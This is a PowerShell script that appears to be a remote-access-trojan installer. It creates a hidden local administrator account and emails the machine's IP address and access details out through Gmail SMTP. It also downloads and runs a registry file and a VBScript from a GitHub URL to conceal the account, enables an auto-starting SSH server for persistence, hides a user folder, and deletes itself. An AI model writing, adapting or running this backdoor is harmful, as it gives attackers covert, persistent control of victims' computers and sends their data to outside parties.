# random string for directory name
function random_text {
    return -join ((65..90) + (97..122) | Get-Random -Count 5 | % {[char]$_})
}

# create local admin
function create_account {
    [CmdletBinding()]
    param (
        [string] $NewLocalAdmin,
        [securestring] $Password
    )
    begin {
    }
    process {
        New-LocalUser "$NewLocalAdmin" -Password $Password -FullName "$NewLocalAdmin" -Description "Temporary local admin" 
        Write-Verbose "$NewLocalAdmin local user craeted" 
        Add-LocalGroupMember -Group "Administrators" -Member "$NewLocalAdmin" 
        Write-Verbose "$NewLocalAdmin added to local administrators group"
    }
    end {

    }
}

# create admin user
$NewLocalAdmin = "winlocal"
$pword = random_text
$Password = (ConvertTo-SecureString $pword -AsPlainText -Force)
create_account -NewLocalAdmin $NewLocalAdmin -Password $Password

# variables
$wd = random_text
$path = "$env:temp/$wd"
$initial_dir = Get-Location
$configfile = "$env:UserName.rat"
$email = Get-Content email.txt
$eword = Get-Content password.txt
$ip = (Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias Ethernet).IPAddress

# writes config file
Add-Content -Path $configfile -Value $ip
Add-Content -Path $configfile -Value $password
Add-Content -Path $configfile -Value $path

# smtp process
Send-MailMessage -From $email -To $email -Subject $configfile -Attachment $configfile -SmtpServer "smtp.gmail.com" -Port 587 -UseSsl -Credential (New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $email, (ConvertTo-SecureString -String $eword -AsPlainText -Force))

# delete config file
Remove-Item -Path $configfile

# goto temp, make working directory
mkdir $path
cd $path

# registry to hide local admin
Invoke-WebRequest -Uri https://raw.githubusercontent.com/gozen-foto/zebroy/refs/heads/main/files/Registry.reg -OutFile "Registry.reg"

# visual basic script to register the registry
Invoke-WebRequest -Uri https://raw.githubusercontent.com/gozen-foto/zebroy/refs/heads/main/files/confirm.vbs -OutFile "confirm.vbs"

#enabling persistence ssh
Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
Start-Service sshd
Set-Service -Name sshd -StartupType 'Automatic'

# install the registry
./"Registry.reg"; ./"confirm.vbs"

# hide WindowsGuest user
cd C:\Users
attrib +h +s +r rootuser

# self delete
cd $initial_dir
del installer.ps1
